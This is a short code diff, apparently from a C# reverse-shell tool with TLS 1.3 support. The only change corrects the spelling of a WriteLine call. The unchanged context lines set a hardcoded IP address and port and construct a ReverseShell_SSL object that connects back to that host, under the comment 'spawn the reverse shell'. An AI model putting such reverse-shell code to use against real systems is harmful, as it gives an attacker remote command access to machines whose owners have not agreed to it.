@@ -51,7 +51,7 @@ ver 1.1 Modified by Zinzloun (support TLS 1.3)
                 string IP = "192.168.1.2";
                 int PORT = 9999;
 
-                Console.Writeline("Using the following connection " + IP + ":" + PORT);
+                Console.WriteLine("Using the following connection " + IP + ":" + PORT);
 
                 //spawn the reverse shell
                 ReverseShell_SSL rS = new ReverseShell_SSL(IP, PORT);
